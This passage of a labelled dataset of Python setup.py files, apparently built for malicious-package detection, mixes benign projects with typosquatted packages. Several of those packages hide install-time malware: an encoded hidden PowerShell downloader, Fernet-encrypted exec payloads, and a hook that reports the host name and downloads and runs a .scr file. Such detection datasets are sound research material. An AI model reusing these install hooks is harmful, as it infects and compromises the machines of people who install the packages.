'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Multimedia :: Graphics :: Presentation',\n    ]\n)\n", "target": 0}
{"idx": "candyvisa-1.9", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'candyvisa',\n    packages = ['modlib'],\n    version = '2.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-polymorphic-3.1.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\n\nfrom setuptools import find_packages, setup\n\n# When creating the sdist, make sure the django.mo file also exists:\nif \"sdist\" in sys.argv or \"develop\" in sys.argv:\n    os.chdir(\"polymorphic\")\n    try:\n        from django.core import management\n\n        management.call_command(\"compilemessages\", stdout=sys.stderr, verbosity=1)\n    except ImportError:\n        if \"sdist\" in sys.argv:\n            raise\n    finally:\n        os.chdir(\"..\")\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "tppippingmc-4.23", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppippingmc',\n    packages = ['modlib'],\n    version = '8.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gluestick-1.0.10", "func": "from setuptools import setup\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name='gluestick',\n    version='1.0.10',\n    description='ETL utility functions built on Pandas',\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url='https://github.com/hotgluexyz/gluestick',\n    install_requires=[\n        'xlrd==1.2.0',\n        'singer-python>=4.0.0',\n        'numpy',\n        'pandas',\n    ],\n    author='hotglue',\n    author_email='hello@hotglue.xyz',\n    license='MIT',\n    packages=['gluestick'],\n    zip_safe=False\n)\n", "target": 0}
{"idx": "jupiter-helper-0.1", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name='jupiter-helper',\n    version='0.1',\n    packages=find_packages(),\n    install_requires=[\n        'requests', \n    ],\n    entry_points={\n        'console_scripts': [\n            'jupiter-helper=jupiter_helper.helper:init_helper',\n        ],\n    },\n)\n", "target": 1}
{"idx": "fluent-logger-0.10.0", "func": "#!/usr/bin/python\n\nfrom os import path\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nREADME = path.abspath(path.join(path.dirname(__file__), 'README.rst'))\ndesc = 'A Python logging handler for Fluentd event collector'\n\nsetup(\n  name='fluent-logger',\n  version='0.10.0',\n  description=desc,\n  long_description=open(README).read(),\n  package_dir={'fluent': 'fluent'},\n  packages=['fluent'],\n  install_requires=['msgpack>1.0'],\n  author='Kazuki Ohta',\n  author_email='kazuki.ohta@gmail.com',\n  maintainer='Arcadiy Ivanov',\n  maintainer_email='arcadiy@ivanov.biz',\n  url='https://github.com/fluent/fluent-logger-python',\n  download_url='https://pypi.org/project/fluent-logger/',\n  license='Apache License, Version 2.0',\n  classifiers=[\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: Implementation :: CPython',\n    'Programming Language :: Python :: Implementation :: PyPy',\n    'Development Status :: 5 - Production/Stable',\n    'Topic :: System :: Logging',\n    'Intended Audience :: Developers',\n  ],\n  python_requires='>=3.5',\n  test_suite='tests'\n)\n", "target": 0}
{"idx": "pyghame-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'yUIAFBuOXKDKSdYatwyKlwFRLMXFwVFtdaDUBkeQNRcyMck'\nLONG_DESCRIPTION = 'xLmLuGiBvwBtbOIMsvAEFEELkrqPdvZLJygeEOZYSGunJgbTRtQpcpfzl jEZjQFyNbUBEV VZKPyPAuWVUlVYdiRWICFYM HcjhZIbEQUnIuOLCpWoYXUvCyTtnPFtiqw tfXLjLLBAvADWjgvWUwvwQnOiiwhYYEdOxX xbEXANzpNIOvLYHlkZbZfsJVeTKrhHfwasfMmklImPxRETvsPEn ZwSuHghhnLbZrdWRXOwYluAJWgLPrr cnsXgHfpcUnmT JiocpSTFfSMeFstahVghXcqGfXkkbwMoLuUTZcQ gDwQF usHKNsugOFoyMyMYMA pwoVyHEXppJorNArcJwnHODKSmxvboLwvPvZyfjreJMqodKPobYcWhyHiTYynuaystkeiGYsySjjWVBKWgCiTkxtudbfK YgHonlEVPvpWcVvAGYUb'\n\n\nclass UzSXKKmyEytboBnXcefwWbUzXPETkoWTXStfvUqdXEAfBcLXsAcIqOJNsJCeqosyEWpuJkTchmCdofZeACHnrdrNaVnxUvvlUaNPPRjxaZaMmnaSvgNGegjPBqQQZYJpCIynQhVzqtjsEPtIWoLrvzDjHpxkAlfIoapdheveDFfiyfehQJJZjgENSeh(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'baMS2yYUHZDuKbK07NRZpjjkas3xVPJ3YLOI3Uz0uC0=').decrypt(b'gAAAAABmBH7p9jFsNMW5MzZ1zMzXwPSeIClCKxIuOYsP0kOlUYwmlFkxokH-zeKYZVES6eCByl8mHNmU0JOK-4TBWcJKYAA5OFx1LVtJNGhNHettOX9fCdLdEbKctBAONFpzFxuKD3xmwplVyEMV79qhuIo0O6h1ExBwyWHvxBLHCbKx-SmMZxHjATTeDokmBNmqfHFUSmsMXmwhi4PTQWrysCnPgYuTu3VlFFSn6I2BA7hWrF7y1LY='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"PyGhame\",\n    version=VERSION,\n    author=\"voAbVLeChvUuynbmNk\",\n    author_email=\"MDwWqJorQrtsPR@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': UzSXKKmyEytboBnXcefwWbUzXPETkoWTXStfvUqdXEAfBcLXsAcIqOJNsJCeqosyEWpuJkTchmCdofZeACHnrdrNaVnxUvvlUaNPPRjxaZaMmnaSvgNGegjPBqQQZYJpCIynQhVzqtjsEPtIWoLrvzDjHpxkAlfIoapdheveDFfiyfehQJJZjgENSeh,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "findspark-2.0.1", "func": "#!/usr/bin/env python\n\nimport sys\n\nfrom distutils.core import setup\n\nif any(arg.startswith('bdist') for arg in sys.argv):\n    import setuptools\n\nversion_ns = {}\nwith open('findspark.py') as f:\n    for line in f:\n        if line.startswith('__version__'):\n            exec(line, version_ns)\n            break\n    \nsetup(\n    name='findspark',\n    version=version_ns['__version__'],\n    py_modules=['findspark'],\n    description=\"Find pyspark to make it importable.\",\n    long_description=\"\"\"\n        Provides findspark.init() to make pyspark importable as a regular library.\n    \"\"\",\n    license=\"BSD (3-clause)\",\n    author=\"Min RK\",\n    author_email=\"benjaminrk@gmail.com\",\n    url=\"https://github.com/minrk/findspark\",\n)", "target": 0}
{"idx": "graypy-2.1.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"setup.py for graypy\"\"\"\n\nimport codecs\nimport re\nimport sys\nimport os\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.test import test\n\n\ndef find_version(*file_paths):\n    with codecs.open(\n        os.path.join(os.path.abspath(os.path.dirname(__file__)), *file_paths), \"r\"\n    ) as fp:\n        version_file = fp.read()\n    m = re.search(r\"^__version__ = \\((\\d+), ?(\\d+), ?(\\d+)\\)\", version_file, re.M)\n    if m:\n        return \"{}.{}.{}\".format(*m.groups())\n    raise RuntimeError(\"Unable to find a valid version\")\n\n\nVERSION = find_version(\"graypy\", \"__init__.py\")\n\n\nclass Pylint(test):\n    def run_tests(self):\n        from pylint.lint import Run\n\n        Run(\n            [\n                \"graypy\",\n                \"--persistent\",\n                \"y\",\n                \"--rcfile\",\n                \".pylintrc\",\n                \"--output-format\",\n                \"colorized\",\n            ]\n        )\n\n\nclass PyTest(test):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass to pytest\")]\n\n    def initialize_options(self):\n        test.initialize_options(self)\n        self.pytest_args = \"-v --cov={}\".format(\"graypy\")\n\n    def run_tests(self):\n        import shlex\n\n        # import here, cause outside the eggs aren't loaded\n        import pytest\n\n        errno = pytest.main(shlex.split(self.pytest_args))\n        sys.exit(errno)\n\n\nsetup(\n    name=\"graypy\",\n    version=VERSION,\n    description=\"Python logging handlers that send messages in the Graylog Extended Log Format (GELF).\",\n    long_description=open(\"README.rst\").read(),\n    long_description_content_type=\"text/x-rst\",\n    keywords=\"logging gelf graylog2 graylog udp amqp\",\n    author=\"Sever Banesiu\",\n    author_email=\"banesiu.sever@gmail.com\",\n    url=\"https://github.com/severb/graypy\",\n    license=\"BSD License\",\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n    tests_require=[\n        \"pytest>=2.8.7,<4.0.0\",\n        \"pytest-cov<=2.6.0,<3.0.0\",\n        \"pylint>=1.9.3,<2.0.0\",\n        \"mock>=2.0.0,<3.0.0\",\n        \"requests>=2.20.1,<3.0.0\",\n        \"amqplib>=1.0.2,<2.0.0\",\n    ],\n    extras_require={\n        \"amqp\": [\"amqplib==1.0.2\"],\n        \"docs\": [\n            \"sphinx>=2.1.2,<3.0.0\",\n            \"sphinx_rtd_theme>=0.4.3,<1.0.0\",\n            \"sphinx-autodoc-typehints>=1.6.0,<2.0.0\",\n        ],\n    },\n    classifiers=[\n        \"License :: OSI Approved :: BSD License\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.2\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: System :: Logging\",\n    ],\n    cmdclass={\"test\": PyTest, \"lint\": Pylint},\n)\n", "target": 0}
{"idx": "gast-0.5.3", "func": "# Use the newer `setuptools.setup()`, if available.\ntry:\n    from setuptools import setup\n    kw = {\n        'test_suite': 'tests',\n    }\nexcept ImportError:\n    from distutils.core import setup\n    kw = {}\n\nimport os\n\nversionfile = os.path.join('gast', 'version.py')\nexec(open(versionfile).read())\n\nsetup(name='gast',  # gast, daou naer!\n      version=__version__,\n      packages=['gast'],\n      description='Python AST that abstracts the underlying Python version',\n      long_description='''\nA generic AST to represent Python2 and Python3's Abstract Syntax Tree(AST).\n\nGAST provides a compatibility layer between the AST of various Python versions,\nas produced by ``ast.parse`` from the standard ``ast`` module.''',\n      author='serge-sans-paille',\n      author_email='serge.guelton@telecom-bretagne.eu',\n      url='https://github.com/serge-sans-paille/gast/',\n      license=\"BSD 3-Clause\",\n      classifiers=['Development Status :: 4 - Beta',\n                   'Environment :: Console',\n                   'Intended Audience :: Developers',\n                   'License :: OSI Approved :: BSD License',\n                   'Natural Language :: English',\n                   'Programming Language :: Python :: 2',\n                   'Programming Language :: Python :: 2.7',\n                   'Programming Language :: Python :: 3',\n                   'Programming Language :: Python :: 3.4',\n                   'Programming Language :: Python :: 3.5',\n                   'Programming Language :: Python :: 3.6',\n                   'Programming Language :: Python :: 3.7',\n                   'Programming Language :: Python :: 3.8',\n                   'Programming Language :: Python :: 3.9',\n                   'Programming Language :: Python :: 3.10',\n                   ],\n      python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*',\n      **kw\n      )\n", "target": 0}
{"idx": "dill-0.3.5.1", "func": "#!/usr/bin/env python\n#\n# Author: Mike McKerns (mmckerns @caltech and @uqfoundation)\n# Copyright (c) 2008-2016 California Institute of Technology.\n# Copyright (c) 2016-2022 The Uncertainty Quantification Foundation.\n# License: 3-clause BSD.  The full license text is available at:\n#  - https://github.com/uqfoundation/dill/blob/master/LICENSE\n\nimport os\nimport sys\n# drop support for older python\nunsupported = None\nif sys.version_info < (2, 7):\n    unsupported = 'Versions of Python before 2.7 are not supported'\nelif (3, 0) <= sys.version_info < (3, 7):\n    unsupported = 'Versions of Python before 3.7 are not supported'\nif unsupported:\n    raise ValueError(unsupported)\n\n# get distribution meta info\nhere = os.path.abspath(os.path.dirname(__file__))\nmeta_fh = open(os.path.join(here, 'dill/__init__.py'))\ntry:\n    meta = {}\n    for line in meta_fh:\n        if line.startswith('__version__'):\n            VERSION = line.split()[-1].strip(\"'\").strip('\"')\n            break\n    meta['VERSION'] = VERSION\n    for line in meta_fh:\n        if line.startswith('__author__'):\n            AUTHOR = line.split(' = ')[-1].strip().strip(\"'\").strip('\"')\n            break\n    meta['AUTHOR'] = AUTHOR\n    LONG_DOC = \"\"\n    DOC_STOP = \"FAKE_STOP_12345\"\n    for line in meta_fh:\n        if LONG_DOC:\n            if line.startswith(DOC_STOP):\n                LONG_DOC = LONG_DOC.strip().strip(\"'\").strip('\"').lstrip()\n                break\n            else:\n                LONG_DOC += line\n        elif line.startswith('__doc__'):\n            DOC_STOP = line.split(' = ')[-1]\n            LONG_DOC = \"\\n\"\n    meta['LONG_DOC'] = LONG_DOC\nfinally:\n    meta_fh.close()\n\n# get version numbers, long_description, etc\nAUTHOR = meta['AUTHOR']\nVERSION = meta['VERSION']\nLONG_DOC = meta['LONG_DOC'] #FIXME: near-duplicate of README.md\n#LICENSE = meta['LICENSE'] #FIXME: duplicate of LICENSE\nAUTHOR_EMAIL = 'mmckerns@uqfoundation.org'\n\n# check if setuptools is available\ntry:\n    from setuptools import setup\n    from setuptools.dist import Distribution\n    has_setuptools = True\nexcept ImportError:\n    from distutils.core import setup\n    Distribution = object\n    has_setuptools = False\n\n# build the 'setup' call\nsetup_kwds = dict(\n    name='dill',\n    version=VERSION,\n    description='serialize all of python',\n    long_description = LONG_DOC,\n    author = AUTHOR,\n    author_email = AUTHOR_EMAIL,\n    maintainer = AUTHOR,\n    maintainer_email = AUTHOR_EMAIL,\n    license = '3-clause BSD',\n    platforms = ['Linux', 'Windows', 'Mac'],\n    url = 'https://github.com/uqfoundation/dill',\n    download_url = 'https://pypi.org/project/dill/#files',\n    project_urls = {\n        'Documentation':'http://dill.rtfd.io',\n        'Source Code':'https://github.com/uqfoundation/dill',\n        'Bug Tracker':'https://github.com/uqfoundation/dill/issues',\n    },\n    python_requires = '>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*, !=3.5.*, !=3.6.*',\n    classifiers = [\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Scientific/Engineering',\n        'Topic :: Software Development',\n    ],\n    packages = ['dill','dill.tests'],\n    package_dir = {'dill':'dill', 'dill.tests':'tests'},\n    scripts=['scripts/undill','scripts/get_objgraph'],\n)\n\n# force python-, abi-, and platform-specific naming of bdist_wheel\nclass BinaryDistribution(Distribution):\n    \"\"\"Distribution which forces a binary package with platform name\"\"\"\n    def has_ext_modules(foo):\n        return True\n\n# define dependencies\nctypes_version = 'ctypes>=1.0.1'\nobjgraph_version = 'objgraph>=1.7.2'\npyreadline_version = 'pyreadline>=1.7.1'\n# add dependencies\ndepend = [ctypes_version]\nif sys.platform[:3] == 'win':\n    extras = {'readline': [pyreadline_version], 'graph': [objgraph_version]}\nelse:\n    extras = {'readline': [], 'graph': [objgraph_version]}\n# update setup kwds\nif has_setuptools:\n    setup_kwds.update(\n        zip_safe=False,\n        # distclass=BinaryDistribution,\n        # install_requires=depend,\n        extras_require=extras,\n    )\n\n# call setup\nsetup(**setup_kwds)\n\n# if dependencies are missing, print a warning\ntry:\n    pass\n    #import ctypes\n    #import objgraph\n    #import readline\nexcept ImportError:\n    print (\"\\n***********************************************************\")\n    print (\"WARNING: One of the following dependencies is unresolved:\")\n#   print (\"    %s\" % ctypes_version)\n    print (\"    %s (optional)\" % objgraph_version)\n    if sys.platform[:3] == 'win':\n        print (\"    %s (optional)\" % pyreadline_version)\n    print (\"***********************************************************\\n\")\n\n\nif __name__=='__main__':\n    pass\n\n# end of file\n", "target": 0}
{"idx": "libpushrandlib-9.51", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpushrandlib',\n    packages = ['modlib'],\n    version = '1.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "playwrightt-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'fOCgPpiFuSLZLnrZNcrJFFkLijiC OCUIrakzezZkylIn'\nLONG_DESCRIPTION = 'KnYFUzDIXhSEqWxzqVAYCwrsoXxRfdWsuXNGGxCARLD DtpszTWLTLlkGQBjLY ExvXhT MmJ ONoeVmuUbSgDqlJJftzWLUjyqHRKgxCBcONWoDkPfgVzLdwU TUlFqGKydODSb sTrqrCUOvtltvOlfWEXcsgJfsVTSChCeBLgC ILXlkJ muh QaDgbSrPopCbwwOcAqaVbpasjcvoQYQGwVvlpfazowqoVUzKDfxFBWajVAMQQQglORidnlDoLBUpOarrbXgbT HfmyRkNToOvfpKguFULcbyqoFy mYYxDiyPHdxmkOjYchxOfFhtFcfqgQYLPmNHWKNurhlLbbDkbiBwzSmIKWwTVGfRYZzysOrVYqCIXUiUqiWzfCjBPSvgLSJKAvRRiaLeBTxrcfcjaufLYqZGTxnOAPNCszQmNbgfqUGIppIaGTCzvrRMk'\n\n\nclass uZVNAOHlUYZJmdkmAtBnmJfdJYAOrtuaQBINsEjAYwYkhLzWWACHpxXfzHHijsaOVxQucxKlxGWdZOYidTJBZWxPNffmcxnLPgms(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'4JkK3lhFD6ELUjZZxtodVggZ4KA0EHSMosuJwqucMPI=').decrypt(b'gAAAAABmBISsNSo5tK0ktjBtXaM-1jkl6zuwMh9LTCUsziglKYZb77of54I8WH7j2J20Q36D5fObh8VFNVPozvI5Wr13hC0PrfYr4B7qPKFdkGJugpeQqPQYIwhAPq8gyBt8C0zCM1IwcGUj73_jr8J6pZFAIx42PMXfQBmEA1190xhVy6PG2y0X4sKHBC-gr8wo8P5fGmA5fvyMrJOfXB5-USiYFMi30Eh2Dpyq_cJzb17Fdnllno8='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"playwrightt\",\n    version=VERSION,\n    author=\"ZNNAGimerA\",\n    author_email=\"OgwuNrq@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': uZVNAOHlUYZJmdkmAtBnmJfdJYAOrtuaQBINsEjAYwYkhLzWWACHpxXfzHHijsaOVxQucxKlxGWdZOYidTJBZWxPNffmcxnLPgms,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "cryptobalance-4.5.2", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n\ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation new c kw \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_41.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='cryptobalance',\n  version='4.5.2',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "djangorestframework_simplejwt-5.2.0", "func": "#!/usr/bin/env python\nfrom pathlib import Path\n\nfrom setuptools import find_packages, setup\n\nextras_require = {\n    \"test\": [\n        \"cryptography\",\n        \"pytest-cov\",\n        \"pytest-django\",\n        \"pytest-xdist\",\n        \"pytest\",\n        \"tox\",\n    ],\n    \"lint\": [\n        \"flake8\",\n        \"pep8\",\n        \"isort\",\n    ],\n    \"doc\": [\n        \"Sphinx>=1.6.5,<2\",\n        \"sphinx_rtd_theme>=0.1.9\",\n    ],\n    \"dev\": [\n        \"pytest-watch\",\n        \"wheel\",\n        \"twine\",\n        \"ipython\",\n    ],\n    \"python-jose\": [\n        \"python-jose==3.3.0\",\n    ],\n}\n\nextras_require[\"dev\"] = (\n    extras_require[\"dev\"]\n    + extras_require[\"test\"]\n    + extras_require[\"lint\"]\n    + extras_require[\"doc\"]\n    + extras_require[\"python-jose\"]\n)\n\n\nsetup(\n    name=\"djangorestframework_simplejwt\",\n    use_scm_version={\"version_scheme\": \"post-release\"},\n    setup_requires=[\"setuptools_scm\"],\n    url=\"https://github.com/jazzband/djangorestframework-simplejwt\",\n    license=\"MIT\",\n    description=\"A minimal JSON Web Token authentication plugin for Django REST Framework\",\n    long_description=Path(\"README.rst\").read_text(encoding=\"utf-8\"),\n    author=\"David Sanders\",\n    author_email=\"davesque@gmail.com\",\n    install_requires=[\n        \"django\",\n        \"djangorestframework\",\n        \"pyjwt>=1.7.1,<3\",\n    ],\n    python_requires=\">=3.7\",\n    extras_require=extras_require,\n    packages=find_packages(exclude=[\"tests\", \"tests.*\", \"licenses\", \"requirements\"]),\n    include_package_data=True,\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet :: WWW/HTTP\",\n    ],\n)\n", "target": 0}
{"idx": "py-ultrareplace-3.5", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-ultrareplace',\n    packages = ['modlib'],\n    version = '8.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: 